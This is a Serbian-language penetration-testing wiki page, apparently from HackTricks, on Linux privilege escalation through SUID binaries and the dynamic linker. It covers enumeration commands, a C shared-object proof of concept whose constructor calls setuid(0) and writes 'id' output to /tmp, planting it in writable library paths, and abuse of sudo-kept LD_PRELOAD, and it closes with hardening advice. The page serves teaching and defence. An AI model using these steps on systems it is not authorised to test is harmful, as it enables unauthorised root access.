# SUID deljene biblioteke i zloupotreba linkera

SUID binarni fajlovi se obično proveravaju zbog direktnog izvršavanja komandi, ali prilagođeni SUID programi mogu biti ranjivi i preko dinamičkog linkera. Zajednička tema je jednostavna: privilegovani izvršni fajl učitava kod sa putanje ili iz konfiguracije na koju korisnik sa nižim privilegijama može da utiče.<sup>[[1]](#references)</sup>

Ova stranica se fokusira na opšte obrasce tehnika: biblioteke koje nedostaju, direktorijume biblioteka sa dozvolom upisivanja, `RPATH`/`RUNPATH`, `LD_PRELOAD` kroz sudo, konfiguraciju linkera i zabunu sa SUID hardlinkovima.

## Brza enumeracija

Počnite pronalaženjem neuobičajenih SUID fajlova i proverom da li su dinamički linkovani:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Fokusirajte se na nestandardne lokacije, putanje prilagođenih aplikacija, binarne datoteke u vlasništvu root korisnika, ali izvan direktorijuma kojima upravljaju paketi, kao i na dependencies učitane iz direktorijuma u koje je moguće upisivati.<sup>[[1]](#references)</sup>

Korisne provere mogućnosti upisa:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Neki custom SUID binarni fajlovi pokušavaju da učitaju shared object koji ne postoji. Ako se putanja koja nedostaje nalazi u direktorijumu kojim upravlja attacker, binarni fajl može učitati kod koji je dostavio attacker kao effective user.<sup>[[1]](#references)</sup>

Pronađite neuspešne pretrage biblioteka pomoću `strace` filtera za sistemske pozive:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ako binarni fajl pretražuje putanju u koju je moguće upisivati za `libexample.so`, minimalna biblioteka za dokaz koncepta može koristiti constructor. Dokaz uticaja tokom validacije treba da ostane bezopasan:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Izgradite ga sa tačnim imenom datoteke koje binarni fajl pokušava da učita:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Uslov koji se može iskoristiti nije samo biblioteka koja nedostaje. Napadač mora moći da postavi kompatibilni shared object na putanju koju će privilegovani loader prihvatiti.<sup>[[1]](#references)</sup>

## Writable Library Directory

Ponekad sve dependencies postoje, ali je jedan od direktorijuma koji se koriste za njihovo razrešavanje writable. To može omogućiti zamenu učitane biblioteke ili postavljanje biblioteke višeg prioriteta sa istim nazivom.<sup>[[1]](#references)</sup>

Proverite putanje dependencies:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ako je direktorijum upisiv, proverite to pristupom bezbednim za kopiranje u lab okruženju. Zamena sistemskih biblioteka na aktivnom hostu može ostaviti procese koji se istovremeno pokreću sa neusklađenim verzijama biblioteka.<sup>[[8]](#references)</sup>

## RPATH i RUNPATH

`RPATH` i `RUNPATH` su unosi dinamičke sekcije koji loaderu govore gde da traži biblioteke. Opasni su u SUID programima kada pokazuju na direktorijume u koje attacker može da upisuje.<sup>[[1]](#references)</sup>

Detektujte ih:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Primer rizičnog izlaza:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ako je `/opt/app/lib` upisiv i binarnom fajlu je potreban `libcustom.so`, napadač možda može da postavi zlonamerni `libcustom.so` tamo:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nisu identični u svim detaljima razrešavanja, ali je za pregled privilege-escalation praktično pitanje isto: da li SUID binary pretražuje directory koji attacker može da upisuje u potrazi za imenom library-ja?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

Kod normalnih programa, `LD_PRELOAD` i `LD_LIBRARY_PATH` mogu da nametnu ili utiču na učitavanje shared object-a. Kod SUID programa, dynamic loader obično ulazi u secure-execution mode i ignoriše opasne environment variables.<sup>[[1]](#references)</sup>

To znači da plain SUID binary obično nije ranjiv samo zato što user može da postavi `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Uobičajeni izuzetak je sudo policy koja dozvoljava postavljanje ili očuvanje loader promenljivih za ciljnu komandu. Proverite `sudo -l` da li sadrži unose kao što su `env_keep+=LD_PRELOAD` ili `env_keep+=LD_LIBRARY_PATH`; ako je cilj dinamički linkovan, može učitati kod pod kontrolom napadača:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Ne mešajte ove slučajeve; loader i sudo policy rules iznad ih razlikuju:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` protiv normalnog SUID binary-ja: obično blokiran secure execution-om.
- `LD_PRELOAD` sačuvan pomoću sudo-a: potencijalno exploitable.
- Nedostajući `.so` u writable path-u: exploitable kada SUID binary prirodno učitava taj path.
- `RPATH`/`RUNPATH` ka writable directory-ju: exploitable kada potrebna library može da se kontroliše.
- `/etc/ld.so.preload` ili write access nad linker config-om: system-wide i high impact.

## Konfiguracija linkera

`ld.so` koristi linker cache i `/etc/ld.so.preload`; `ldconfig` izgrađuje taj cache iz `/etc/ld.so.conf` i fajlova uključenih iz njega, najčešće iz `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Provere visoke vrednosti:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` je posebno opasan jer može da natera shared object da se učita u privilegovane procese.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks mogu učiniti da se isti SUID inode pojavi pod više imena.<sup>[[9]](#references)</sup> Ovo je korisno za skrivanje privilegovanog helpera, zbunjivanje cleanup-a ili zaobilaženje naivne provere zasnovane na putanji.

Pronađite SUID fajlove sa više od jednog linka:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ispitajte sve putanje ka istom inode-u:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Zloupotreba nije u tome što hardlink menja dozvole. Zloupotreba je u zabuni u putanji: privilegovani inode može biti dostupan kroz naziv koji defenders ili skripte ne očekuju.<sup>[[9]](#references)</sup> Za detaljniji opis inode-a i hardlink workflow-a pogledajte [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Odbrambene napomene

- SUID binaries treba da budu minimalni, auditovani i, gde je moguće, pod upravljanjem package manager-a.
- Izbegavajte `RPATH`/`RUNPATH` unose koji pokazuju na direktorijume u koje je moguće upisivati ili kojima upravlja aplikacija.<sup>[[1]](#references)[[8]](#references)</sup>
- Direktorijumi biblioteka treba da budu u vlasništvu root-a i da u njih ne mogu upisivati obični korisnici.<sup>[[8]](#references)</sup>
- Nemojte zadržavati `LD_PRELOAD`, `LD_LIBRARY_PATH` ili slične loader varijable kroz sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Nadgledajte `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` i neočekivane SUID fajlove.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Pregledajte SUID fajlove sa hardlink-ovima i istražite prilagođene SUID wrapper-e izvan standardnih sistemskih putanja.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual stranica](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual stranica](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual stranica](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual stranica](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual stranica](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
